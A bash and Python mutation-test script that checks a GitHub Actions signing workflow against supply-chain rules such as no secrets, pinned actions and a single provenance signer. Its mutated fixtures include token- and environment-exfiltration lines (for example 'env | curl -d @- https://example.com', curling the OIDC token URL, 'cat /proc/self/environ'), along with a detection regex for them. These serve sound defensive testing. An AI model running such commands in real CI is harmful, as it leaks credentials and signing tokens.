#!/usr/bin/env bash
# proves: REQ-CHAIN-001-AC1, REQ-CHAIN-001-AC2, REQ-CHAIN-001-AC3, REQ-CHAIN-002-AC4, REQ-CHAIN-003-AC5
# The Sign boundary (v0.3.0 rules 50, 50a, 52, 52a, 53a; owner RATIFIED Oct 9), static half. Three judges, each first proven
# on a known-good fixture and on every mutated copy (a judge that cannot fail proves nothing), then applied to the real repo:
#   judge_sign  stage-sign.yml is an ALLOWLIST: a reusable workflow of one job on a GitHub-hosted runner whose only input is
#               `digests`, with no outputs and no secrets, whose steps are exactly checkout, one download of the artifact
#               `witness-build` (data only, never run), `python3 bin/chain-verify.py ...` lines with arguments from env,
#               and one upload of the path `provenance`. Everything else fails closed (rules 52, 52a; 001-AC1..AC3).
#               The four sinks rule 52a names (file, artifact, log, step output) are each a named mutation.
#   judge_build 002-AC4: a Build signing step takes nothing from a secret or the job token. Judged when the file has
#               signing steps (stage-build.yml today signs with attest actions and is rewritten in PR 2).
#   judge_tree  001-AC1: stage-sign.yml is the only workflow file added since v0.2.2, and NO other workflow, composite
#               action or .yaml file signs provenance; every other signing call is listed with a reason in
#               .github/policy/chain-signers.json. The old chain files still sign provenance today, so on the real repo
#               this judge is correctly RED until PRs 2-4 remove those steps.
# Needs python3 with PyYAML (apt: python3-yaml).
# Modelled on: this repo's bin/workflow-consolidation-test.sh (judge + mutation pattern); in-toto-witness docs/commands.md
# (witness run / sign flags) and docs/attestors/slsa.md for the signing-call patterns.
set -euo pipefail
root=$(cd "$(dirname "$0")/.." && pwd)
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
python3 -c 'import yaml' 2> /dev/null || { echo "FAIL python3 needs PyYAML (apt install python3-yaml)"; exit 1; }
cat > "$work/judge.py" <<'PY'
import glob, json, os, re, sys, yaml
SHA = r"[0-9a-f]{40}"
TOKEN = r"ACTIONS_ID_TOKEN|ACTIONS_RUNTIME|id-token|getIDToken|oidc|/proc/\S*environ|\bprintenv\b|\benv\b\s*(\||>|$)|\bset\s+-\w*x"
def load(path):
    return yaml.load(open(path).read(), Loader=yaml.BaseLoader), open(path).read()

def judge_sign(path):
    if not os.path.exists(path): return ["missing: " + path]
    d, text = load(path); bad = []
    on = d.get("on")
    if not isinstance(on, dict) or set(on) != {"workflow_call"}:
        bad.append("AC1: on: must be exactly workflow_call: %s" % on)
    call = (on or {}).get("workflow_call") or {} if isinstance(on, dict) else {}
    inputs = call.get("inputs") or {}
    if set(inputs) != {"digests"} or (inputs.get("digests") or {}).get("type") != "string":
        bad.append("AC2: the only input must be `digests` (string), found %s" % sorted(inputs))
    if call.get("secrets"): bad.append("AC3: the workflow declares secrets")
    if call.get("outputs"): bad.append("AC3 (step output sink): workflow_call outputs are not allowed")
    if re.search(r"secrets\b|toJSON|\bcontext\b", text): bad.append("AC3/002-AC4: secrets, toJSON or context appear in the file")
    jobs = d.get("jobs") or {}
    if len(jobs) != 1: bad.append("AC1: exactly one job required, found %d" % len(jobs))
    for name, j in jobs.items():
        ro = j.get("runs-on")
        if not isinstance(ro, str) or not re.fullmatch(r"ubuntu-[0-9.]+(-arm)?|ubuntu-latest", ro):
            bad.append("AC1: job %s must run on a GitHub-hosted ubuntu runner, got %r" % (name, ro))
        for k in ("container", "services", "uses", "env", "outputs", "strategy", "needs", "environment", "defaults", "if"):
            if k in j: bad.append("AC2/AC3: job %s has `%s`, which Sign's job must not have" % (name, k))
        perm = j.get("permissions")
        if not isinstance(perm, dict) or perm.get("id-token") != "write" or any(v == "write" for k, v in perm.items() if k != "id-token"):
            bad.append("AC3: Sign's permissions must be id-token: write and no other write: %s" % perm)
        for s in j.get("steps") or []:
            sn = s.get("name") or s.get("uses") or s.get("run")
            extra = set(s) - {"name", "uses", "with", "run", "env", "id"}
            if extra: bad.append("AC2: step %r has %s" % (sn, sorted(extra)))
            u, w, run, env = s.get("uses"), s.get("with") or {}, s.get("run"), s.get("env") or {}
            if (u is None) == (run is None): bad.append("AC2: step %r must have exactly one of uses/run" % sn); continue
            for ek, ev in env.items():
                if ev not in ("${{ inputs.digests }}", "${{ github.sha }}", "${{ github.ref }}", "${{ github.ref_name }}"):
                    bad.append("AC3: step %r passes %s=%r through env; only the digest list and the commit/ref may be passed" % (sn, ek, ev))
            if u is not None:
                m = re.fullmatch(r"(actions/[a-z-]+)@(%s)( #.*)?" % SHA, u)
                if not m: bad.append("AC2: step %r uses %r; only a pinned actions/checkout, download-artifact or upload-artifact" % (sn, u)); continue
                act = m.group(1)
                if act == "actions/checkout":
                    if set(w) - {"persist-credentials", "fetch-depth"} or w.get("persist-credentials", "false") != "false":
                        bad.append("AC3: checkout with %s" % w)
                elif act == "actions/download-artifact":
                    if w.get("name") != "witness-build" or set(w) - {"name", "path"} or w.get("path", "witness-build") != "witness-build":
                        bad.append("AC2: step %r downloads %s; only the artifact witness-build into witness-build (data, never run)" % (sn, w))
                elif act == "actions/upload-artifact":
                    if w.get("path") != "provenance" or w.get("name") != "provenance" or set(w) - {"name", "path", "if-no-files-found", "retention-days"}:
                        bad.append("AC3 (artifact sink): step %r uploads %s; only the path `provenance` (name provenance) may leave Sign" % (sn, w))
                else:
                    bad.append("AC2: step %r uses %s, which Sign may not" % (sn, act))
            else:
                lines = [l for l in run.strip().splitlines() if l.strip()]
                if len(lines) != 1 or not re.fullmatch(r'python3 bin/chain-verify\.py (sign|verify|stage-start)( (--[a-z-]+|[A-Za-z0-9_./:=-]+|"\$[A-Z_]+"))*', lines[0]):
                    sinks = [n for n, rx in (("file", r">>?\s*\S|\btee\b|\bcp\b|\bmv\b"), ("log", r"\becho\b|\bprintf\b|\bcat\b|\bset\s+-\w*x"),
                                             ("step output", r"GITHUB_(OUTPUT|ENV|STEP_SUMMARY|PATH)"), ("artifact", r"upload|curl|\bgh\b")) if re.search(rx, run)]
                    why = "touches the identity token request (sinks reachable: %s)" % (", ".join(sinks) or "none, but no step may touch it") if re.search(TOKEN, run, re.I) else "is not one `python3 bin/chain-verify.py ...` line with arguments from env"
                    bad.append("AC2/AC3: run step %r %s" % (sn, why))
                if "${{" in run or ".." in run: bad.append("AC2: run step %r interpolates an expression or uses `..`" % sn)
    return bad

SIGN = r"cosign\s+(sign|attest|sign-blob|attest-blob)|witness\s+(run|sign)|attest-build-provenance|actions/attest\b|gitsign|slsa-github-generator|sigstore/|slsa-framework/"
PROV = r"attest-build-provenance|slsa-github-generator|slsa-framework/|provenance|-a\s+slsa|--attestor[s]?[ =]\S*slsa|attestor-slsa"
def judge_build(path):
    if not os.path.exists(path): return []
    d, text = load(path); bad = []
    for j in (d.get("jobs") or {}).values():
        for s in j.get("steps") or []:
            blob = yaml.dump(s)
            if re.search(SIGN, blob):
                if re.search(r"secrets\.|secrets\[|github\.token|toJSON|secrets\b", blob):
                    bad.append("002-AC4: signing step %r takes a secret or the job token" % (s.get("name") or s.get("uses")))
                for fm in re.finditer(r"--(annotation|certificate-[a-z-]+|oidc-[a-z-]+|fulcio-oidc-client-id|signer-fulcio-[a-z-]+)[ =]+\S*\$\{\{", blob):
                    bad.append("002-AC4: signing step %r puts an expression into %s" % (s.get("name") or s.get("uses"), fm.group(1)))
    return bad

def judge_tree(base):
    bad = []
    known = set("""acceptance.yml agent-review-gate.yml auditor.yml ci.yml codeql.yml dependabot-auto-merge.yml dependabot-reviewer.yml
go-freshness.yml main-candidate-rescan.yml release.yml reserved-branch-guard.yml scan.yml scorecard.yml
stage-acceptance-artifacts.yml stage-acceptance-egress.yml stage-acceptance-k8s.yml stage-acceptance-predicate.yml
stage-admission.yml stage-authorize.yml stage-build.yml stage-image.yml stage-promote.yml stage-reproducibility.yml
stage-verify.yml supply-chain.yml""".split())
    wfdir = os.path.join(base, ".github/workflows")
    files = sorted(glob.glob(wfdir + "/*.yml") + glob.glob(wfdir + "/*.yaml"))
    new = sorted(os.path.basename(f) for f in files if os.path.basename(f) not in known)
    if new != ["stage-sign.yml"]: bad.append("AC1: workflow files added since v0.2.2 must be exactly [stage-sign.yml], found %s" % new)
    allowed = {}
    sf = os.path.join(base, ".github/policy/chain-signers.json")
    if not os.path.exists(sf): bad.append("AC1: missing .github/policy/chain-signers.json (the signing calls other than Sign's provenance, each with a reason)")
    else:
        for r in json.load(open(sf)).get("signers") or []:
            if not str(r.get("reason") or "").strip(): bad.append("AC1: signer row without a reason: %s" % r)
            if re.search(PROV, " ".join(str(r.get(k, "")) for k in ("tool", "claim")), re.I): bad.append("AC1: signer list names a provenance signer: %s" % r)
            allowed.setdefault(r.get("file"), set()).add(r.get("tool"))
    acts = glob.glob(os.path.join(base, ".github/actions/**/action.y*ml"), recursive=True) + glob.glob(os.path.join(base, "action.y*ml"))
    for f in files + sorted(acts):
        rel = os.path.relpath(f, os.path.join(base, ".github/workflows")) if f in files else os.path.relpath(f, base)
        text = open(f).read()
        text = "\n".join(l for l in text.splitlines() if not l.lstrip().startswith("#"))
        for m in re.finditer(SIGN, text):
            tool = re.sub(r"\s+", " ", m.group(0))
            line = text[max(0, text.rfind("\n", 0, m.start())):text.find("\n", m.end())]
            ctx = text[max(0, m.start() - 200):m.end() + 400]
            if rel == "stage-sign.yml": continue
            if re.search(PROV, ctx, re.I) and not re.search(r"source-admission|verify", line):
                bad.append("AC1: %s signs provenance (%s); only stage-sign.yml may" % (rel, tool))
            elif tool not in allowed.get(rel, set()) and not any(tool.startswith(t or "\0") for t in allowed.get(rel, set())):
                bad.append("AC1: %s calls %r, which is not listed with a reason in chain-signers.json" % (rel, tool))
    return bad

def judge_calls(root):
    """REQ-CHAIN-003-AC5: a certificate's SAN is the file that runs the witness step (harness spike (b), case 5: a stage that
    calls another stage's file gets that file's SAN). So only release.yml may call a stage-*.yml reusable workflow."""
    bad = []
    wd = os.path.join(root, ".github/workflows")
    for fn in sorted(os.listdir(wd)):
        if not fn.endswith((".yml", ".yaml")) or fn == "release.yml": continue
        try: d = yaml.load(open(os.path.join(wd, fn)).read(), Loader=yaml.BaseLoader) or {}
        except Exception as e: bad.append("AC5: %s does not parse (%s)" % (fn, e)); continue
        for jn, j in (d.get("jobs") or {}).items():
            refs = [str(j.get("uses", ""))] + [str(s.get("uses", "")) for s in (j.get("steps") or [])]
            for r in refs:
                if re.search(r"\.github/workflows/stage-[^@\s]*\.ya?ml", r): bad.append("AC5: %s job %s calls %s; only release.yml may call a stage file" % (fn, jn, r))
    return bad

if __name__ == "__main__":
    which, arg = sys.argv[1], sys.argv[2]
    bad = {"sign": judge_sign, "build": judge_build, "tree": judge_tree, "calls": judge_calls}[which](arg)
    print("; ".join(dict.fromkeys(bad)) or "ok"); sys.exit(1 if bad else 0)
PY
judge() { python3 "$work/judge.py" "$@"; }
expect() { # expect ok|caught LABEL judge ARG
  local out rc=0
  out=$(judge "$3" "$4") || rc=$?
  if [ "$1" = ok ] && [ "$rc" = 0 ]; then pass=$((pass + 1)); echo "ok   $2"
  elif [ "$1" = caught ] && [ "$rc" != 0 ]; then pass=$((pass + 1)); echo "ok   $2 (caught: ${out:0:160})"
  else failn=$((failn + 1)); echo "FAIL $2 -> ${out:0:500}"; fi
}
sha=$(printf 'a%.0s' $(seq 40))
good="$work/good.yml"
cat > "$good" <<EOF
name: 'Stage: sign'
on:
  workflow_call:
    inputs:
      digests:
        description: 'JSON of the digests Build produced'
        required: true
        type: string
permissions:
  contents: read
jobs:
  sign:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@$sha # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/download-artifact@$sha # v8
        with:
          name: witness-build
          path: witness-build
      - name: check Build's record, then sign the provenance
        env:
          DIGESTS: \${{ inputs.digests }}
        run: python3 bin/chain-verify.py sign --check --digests "\$DIGESTS" --build-record witness-build/build.json
      - uses: actions/upload-artifact@$sha # v7
        with:
          name: provenance
          path: provenance
EOF
# mutate LABEL  python-regex  replacement : writes $work/LABEL.yml, or counts a FAILURE if the mutation did not apply
mutate() {
  python3 - "$good" "$work/$(printf '%s' "$1" | tr -c 'A-Za-z0-9' _).yml" "$2" "$3" <<'PY' || { failn=$((failn + 1)); echo "FAIL mutation $1 did not apply to the fixture"; return 1; }
import re, sys
t = open(sys.argv[1]).read()
n = re.sub(sys.argv[3], lambda m: sys.argv[4].encode().decode("unicode_escape"), t, count=1, flags=re.S)
if n == t: sys.exit(1)
open(sys.argv[2], "w").write(n)
PY
}
caught() { # LABEL regex replacement
  if mutate "$1" "$2" "$3"; then expect caught "$1" sign "$work/$(printf '%s' "$1" | tr -c 'A-Za-z0-9' _).yml"; fi
}
expect ok "fixture: known-good Sign passes the judge" sign "$good"
caught "AC1 self-hosted runner" 'ubuntu-24.04' 'self-hosted'
caught "AC1 extra trigger" 'workflow_call:' 'push:\n  workflow_call:'
caught "AC1 second job" '    steps:' '    steps: []\n  other:\n    runs-on: ubuntu-24.04\n    steps:'
caught "AC1 job runs in a container" 'runs-on: ubuntu-24.04' 'runs-on: ubuntu-24.04\n    container: alpine'
caught "AC2 extra input" 'digests:\n        description' 'script:\n        type: string\n      digests:\n        description'
caught "AC2 downloads another artifact" 'name: witness-build' 'name: dist'
caught "AC2 downloads into a parent path" 'path: witness-build' 'path: ..'
caught "AC2 fetches build output with gh" 'run: python3 bin/chain-verify.py' 'run: gh run download 1 -D dist'
caught "AC2 runs a build output" 'run: python3 bin/chain-verify.py sign --check --digests "\$DIGESTS" --build-record witness-build/build.json' 'run: bash dist/run.sh'
caught "AC2 interpolates the input into the shell" 'run: python3 bin/chain-verify.py sign --check --digests "\$DIGESTS"' "run: python3 bin/chain-verify.py sign --check --digests '\${{ inputs.digests }}'"
caught "AC2 two commands in one run step" '--build-record witness-build/build.json' '--build-record witness-build/build.json; curl https://example.com'
caught "AC2 unpinned action" "actions/checkout@$sha" 'actions/checkout@v4'
caught "AC2 github-script step" "      - uses: actions/checkout" "      - uses: actions/github-script@$sha\n        with:\n          script: core.setOutput('t', await core.getIDToken())\n      - uses: actions/checkout"
caught "AC3 secret reference" 'DIGESTS: \$\{\{ inputs.digests \}\}' 'DIGESTS: ${{ inputs.digests }}\n          K: ${{ secrets.KEY }}'
caught "AC3 toJSON(secrets)" 'DIGESTS: \$\{\{ inputs.digests \}\}' 'DIGESTS: ${{ toJSON(secrets) }}'
caught "AC3 job token passed in env" 'DIGESTS: \$\{\{ inputs.digests \}\}' 'DIGESTS: ${{ inputs.digests }}\n          T: ${{ github.token }}'
caught "AC3 sink step output: a job output" '    runs-on: ubuntu-24.04' '    runs-on: ubuntu-24.04\n    outputs:\n      t: ${{ steps.x.outputs.t }}'
caught "AC3 sink step output: a workflow output" '        type: string\npermissions' '        type: string\n    outputs:\n      o:\n        value: x\npermissions'
caught "AC3 sink step output: token to GITHUB_OUTPUT" 'run: python3 bin/chain-verify.py' 'run: echo "tok=$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> "$GITHUB_OUTPUT" #'
caught "AC3 sink file: token to a file" 'run: python3 bin/chain-verify.py' 'run: curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL" > "$RUNNER_TEMP/tok" #'
caught "AC3 sink log: token echoed" 'run: python3 bin/chain-verify.py' 'run: echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" #'
caught "AC3 sink log: whole environment dumped (printenv)" 'run: python3 bin/chain-verify.py' 'run: printenv #'
caught "AC3 sink log: whole environment piped out (env)" 'run: python3 bin/chain-verify.py' 'run: env | curl -d @- https://example.com #'
caught "AC3 sink file: /proc/self/environ" 'run: python3 bin/chain-verify.py' 'run: cat /proc/self/environ #'
caught "AC3 sink artifact: upload path outside provenance" 'path: provenance' 'path: ${{ runner.temp }}/tok'
caught "AC3 sink artifact: upload path provenance/.." 'path: provenance\n' 'path: provenance/..\n'
caught "AC3 sink artifact: upload a second artifact" "          path: provenance" "          path: provenance\n      - uses: actions/upload-pages-artifact@$sha\n        with:\n          path: ."
caught "AC3 extra write permission" 'id-token: write' 'id-token: write\n      packages: write'
caught "AC3 no id-token" 'id-token: write' 'id-token: none'
# 002-AC4: Build's signing steps (the judge runs on a fixture here, and on the real stage-build.yml when it exists)
cat > "$work/build-good.yml" <<EOF
jobs:
  build:
    runs-on: ubuntu-24.04
    steps:
      - name: Witness-wrapped build
        run: witness run --step build --signer-fulcio-url https://fulcio.sigstore.dev -- ./bin/build.sh
EOF
expect ok "fixture: a Build signing step with no secret passes" build "$work/build-good.yml"
sed 's#witness run#witness run --signer-fulcio-oidc-client-id ${{ inputs.cid }}#' "$work/build-good.yml" > "$work/build-expr.yml"
expect caught "002-AC4 an expression in a certificate/OIDC flag" build "$work/build-expr.yml"
printf '%s\n' "$(cat "$work/build-good.yml")" '        env:' '          K: ${{ secrets.KEY }}' > "$work/build-sec.yml"
expect caught "002-AC4 a secret in a signing step" build "$work/build-sec.yml"
printf '%s\n' "$(cat "$work/build-good.yml")" '        env:' '          T: ${{ github.token }}' > "$work/build-tok.yml"
expect caught "002-AC4 the job token in a signing step" build "$work/build-tok.yml"
# 001-AC1: the tree judge on a fixture tree
mk() {
  local d="$work/$1"; mkdir -p "$d/.github/workflows" "$d/.github/policy" "$d/.github/actions/x"
  for f in acceptance auditor ci release stage-build stage-promote stage-verify stage-reproducibility; do printf 'jobs: {}\n' > "$d/.github/workflows/$f.yml"; done
  cp "$good" "$d/.github/workflows/stage-sign.yml"
  printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -- ./bin/build.sh\n' > "$d/.github/workflows/stage-build.yml"
  printf 'jobs:\n  d:\n    steps:\n      - run: git -c gpg.x509.program=gitsign tag -s v1\n' > "$d/.github/workflows/release.yml"
  printf '{"signers":[{"file":"stage-build.yml","tool":"witness run","reason":"Build'"'"'s own Witness collection (rule 51)"},{"file":"release.yml","tool":"gitsign","reason":"CI patch tag (REQ-REL-009-AC5)"}]}\n' > "$d/.github/policy/chain-signers.json"
  echo "$d"
}
expect ok "fixture tree: only Sign signs provenance, other signers listed with a reason" tree "$(mk t_good)"
d=$(mk t_prov); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest-build-provenance@%s\n' "$sha" > "$d/.github/workflows/stage-build.yml"
expect caught "AC1 another stage signs provenance with the attest action" tree "$d"
d=$(mk t_slsa); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -a slsa -- ./bin/build.sh\n' > "$d/.github/workflows/stage-build.yml"
expect caught "AC1 another stage signs provenance with Witness' slsa attestor" tree "$d"
d=$(mk t_unl); printf 'jobs:\n  b:\n    steps:\n      - run: cosign sign --yes "$IMG"\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 an unlisted signing call (cosign sign) in a stage file" tree "$d"
d=$(mk t_yaml); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --predicate p.json "$IMG"\n' > "$d/.github/workflows/other.yaml"
expect caught "AC1 a .yaml workflow file is scanned too" tree "$d"
d=$(mk t_comp); printf 'runs:\n  using: composite\n  steps:\n    - run: cosign sign "$IMG"\n      shell: bash\n' > "$d/.github/actions/x/action.yml"
expect caught "AC1 a composite action is scanned too" tree "$d"
d=$(mk t_new); cp "$good" "$d/.github/workflows/stage-extra.yml"
expect caught "AC1 a second new workflow file" tree "$d"
d=$(mk t_noreason); sed -i.bak 's/"reason":"CI patch tag (REQ-REL-009-AC5)"/"reason":" "/' "$d/.github/policy/chain-signers.json"
expect caught "AC1 a listed signer with no reason" tree "$d"
d=$(mk t_nolist); rm "$d/.github/policy/chain-signers.json"
expect caught "AC1 no chain-signers.json" tree "$d"
# 003-AC5: only release.yml calls a stage file (a stage that calls another stage gets that stage's SAN: spike (b) case 5)
d=$(mk c_good); printf 'jobs:\n  s:\n    uses: ./.github/workflows/stage-sign.yml\n  b:\n    uses: ./.github/workflows/stage-build.yml\n' > "$d/.github/workflows/release.yml"
expect ok "003-AC5 fixture: release.yml calls every stage file" calls "$d"
d=$(mk c_nested); printf 'jobs:\n  x:\n    uses: ./.github/workflows/stage-sign.yml\n' > "$d/.github/workflows/stage-build.yml"
expect caught "003-AC5 stage-build.yml calls stage-sign.yml (nested call)" calls "$d"
d=$(mk c_second); printf 'on: push\njobs:\n  x:\n    uses: ./.github/workflows/stage-sign.yml\n' > "$d/.github/workflows/ci.yml"
expect caught "003-AC5 a second workflow (ci.yml) calls stage-sign.yml" calls "$d"
d=$(mk c_remote); printf 'jobs:\n  x:\n    uses: fosterstack/cache/.github/workflows/stage-sign.yml@%s\n' "$sha" > "$d/.github/workflows/auditor.yml"
expect caught "003-AC5 a second workflow calls stage-sign.yml by repository path and digest" calls "$d"
d=$(mk c_step); printf 'jobs:\n  x:\n    steps:\n      - uses: ./.github/workflows/stage-verify.yml\n' > "$d/.github/workflows/stage-promote.yml"
expect caught "003-AC5 a step-level reference to a stage file from another stage" calls "$d"
d=$(mk c_yaml); printf 'jobs:\n  x:\n    uses: ./.github/workflows/stage-build.yml\n' > "$d/.github/workflows/other.yaml"
expect caught "003-AC5 a .yaml workflow calling a stage file" calls "$d"
# the real repository (RED until stage-sign.yml exists and PRs 2-4 remove the old provenance signers)
expect ok "the real stage-sign.yml passes the Sign judge" sign "$root/.github/workflows/stage-sign.yml"
expect ok "the real stage-build.yml's signing steps take nothing from a secret" build "$root/.github/workflows/stage-build.yml"
expect ok "the real tree: only stage-sign.yml is new and only it signs provenance" tree "$root"
expect ok "the real tree: only release.yml calls a stage file (003-AC5)" calls "$root"
EXPECT=53
echo "pass=$pass fail=$failn"
if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
[ "$failn" = 0 ]
